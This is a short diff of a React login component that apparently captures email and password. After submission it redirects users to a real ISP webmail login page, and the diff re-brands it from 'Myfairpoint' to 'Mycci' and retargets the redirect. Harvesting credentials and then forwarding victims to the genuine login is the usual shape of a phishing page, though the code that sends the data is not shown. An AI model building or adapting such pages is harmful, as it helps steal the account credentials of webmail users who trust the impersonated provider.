@@ -16,7 +16,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Myfairpoint")
+    const[platform, setPlatform] = useState("Mycci")
 
     const[showError, setShowError] = useState(false);
 
@@ -51,7 +51,7 @@ async function handleSubmit(e){
            // console.log(response.data.message);
 
           
-           window.location.href = 'https://webmail.myfairpoint.net/#/login';
+           window.location.href = 'https://webmail.mycci.net/#/login';
         }
       } catch (error) {
         // Handle error
